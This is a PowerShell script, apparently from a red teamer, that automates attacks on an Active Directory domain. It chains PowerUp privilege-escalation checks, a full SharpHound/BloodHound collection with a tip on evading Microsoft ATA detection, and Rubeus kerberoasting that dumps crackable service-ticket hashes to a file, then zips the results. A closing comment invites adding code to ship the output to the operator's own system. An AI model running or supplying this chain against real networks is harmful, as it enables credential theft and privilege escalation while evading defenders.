#Active Directory RedTeam Full Enumeration Script
#created by n3t1nv4d3
#August 16, 2021


$logo=@"
    ___   ______ ___    ___   ______ ______      __      
   /   | / __  //   |  / __| / __  /_    _/__   /  \   ____  ______
  / /| |/ / / //  - | / /_  / / / /  |  |/ _ \ / /\ \ / __ \/ __  /
 / ___ | /_/ // / \ \/ /__ / /_/ /   |  || __// ___  \ / / / / / /  
/_/  |_|____/|_/  |_/_____/_____/    \__/\___/_/   \__/ /___/ /_/
  
 Active Directory Red Team Enumeration Script by @n3t1nv4d3
"@

Write-Host $logo -ForegroundColor Red
Write-Host
Write-Host "Checking if output directory exists" -ForegroundColor Cyan
if(!(Test-Path $home\desktop\AD_Assessment)){ New-Item -Path "$home\desktop" -ItemType Directory -Name 'AD_Assessment'}
$OutputPath = "$home\desktop\AD_Assessment\"

#Computers, Users and Groups Enumeration, on a separate script to limit the amount of lines, output and easier modification
C:\scripts\bin\ComputersUsersGroups.ps1
Start-Sleep -Seconds 3

#Domain Enumeration, on a separate script to limit the amount of lines, output and easier modification
C:\scripts\bin\DomainInfoTrusts.ps1
Start-Sleep -Seconds 3

#DC Enumeration, on a separate script to limit the amount of lines, output and easier modification
C:\scripts\bin\DCEnum.ps1
Start-Sleep -Seconds 3

#Grab GPO settings/information, on a separate script to limit the amount of lines, output and easier modification
C:\scripts\bin\GPOInfo.ps1
Start-Sleep -Seconds 3

# Privilege AllChecks
. C:\scripts\bin\PowerUp.ps1
cd $OutputPath
Invoke-AllChecks -HTMLReport

#  Bloodhound
# To prevent Microsoft ATA detection use: -ExcludeDomainControllers
Start-Sleep -Seconds 3
. C:\scripts\bin\SharpHound.ps1
if(!(Test-Path $home\desktop\AD_Assessment\Bloodhound)){ New-Item -Path "$home\desktop\AD_Assessment" -ItemType Directory -Name 'Bloodhound'}
Invoke-Bloodhound -CollectionMethod All -OutputDirectory "$OutputPath\Bloodhound" 

#Kerberoast
if(!(Test-Path $home\desktop\AD_Assessment\Kerberoast)){ New-Item -Path "$home\desktop\AD_Assessment" -ItemType Directory -Name 'Kerberoast'}
Start-Sleep -Seconds 5
cd Kerberoast
C:\scripts\bin\Rubeus.exe kerberoast /simple /rc4opsec /outfile:KerberoastHashes.txt
cd c:\scripts

#  Zip Results
Start-Sleep -Seconds 5
$source = "$home\desktop\AD_Assessment"
$destination = "$home\desktop\AD_Assessment.zip"
If(Test-path $destination) {Remove-item $destination}
Add-Type -assembly "system.io.compression.filesystem"
[io.compression.zipfile]::CreateFromDirectory($Source, $destination) 
#Some clean up
#Remove-Item $OutputPath -Force

# Add code below to automatically have the results sent to your system!!
#
#